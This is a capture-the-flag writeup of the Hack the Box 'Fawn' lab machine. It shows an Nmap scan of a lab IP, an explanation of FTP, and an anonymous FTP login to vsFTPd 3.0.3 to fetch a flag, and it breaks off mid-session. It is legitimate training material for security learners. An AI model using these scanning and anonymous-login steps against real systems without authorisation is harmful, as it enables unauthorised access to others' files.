## TL;DR

This writeup is based on the [__Fawn__](https://app.hackthebox.com/starting-point){:target="_blank"} machine, which is an easy-rated Linux box on Hack the Box. I began by scanning the target and found an open FTP port (21) running vsFTPd 3.0.3. The FTP service allowed anonymous login, so I logged in without a password and found a file named `flag.txt` in the directory listing. I downloaded the file, read its contents, and captured the flag.

## Scanning Network

I began by performing an Nmap scan, which revealed open ports 21 , corresponding to FTP. Here are the results from Nmap scan:

```bash
nmap -sC -sV -A -T4 -Pn 10.129.1.14 -oN scan/normal.scan
Starting Nmap 7.94 ( https://nmap.org ) at 2025-02-15 11:00 IST

## Enumeration

`vsFTPd 3.0.3` is an outdated version of the FTP service.

`FTP` (File Transfer Protocol) is a network protocol used to transfer files between a client and a server over a TCP/IP network. FTP allows users to upload, download, and manage files on a remote server. However, since it transmits data in plaintext, it poses security risks, especially with anonymous access, making secure alternatives like SFTP and FTPS more commonly used for sensitive data transfers.

While inspecting the Nmap scan output, I discovered that anonymous FTP login was allowed.

FTP supports both authenticated and anonymous access, where anonymous users log in with the username **anonymous** and typically donâ€™t need a password, although some servers may request an email address.

## Exploitation

I attempted to log into FTP using the `anonymous` user.

```bash
ftp 10.129.1.14
Connected to 10.129.1.14.
220 (vsFTPd 3.0.3)
Name (10.129.1.14:samh4cks): anonymous
331 Please specify the password.
Password: 
230 Login successful.
```

I successfully logged in as the `anonymous` user, so let's read the flag.

```bash
 ftp 10.129.1.14
Connected to 10.129.1.14.
220 (vsFTPd 3.0.3)
Name (10.129.1.14:samh4cks): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
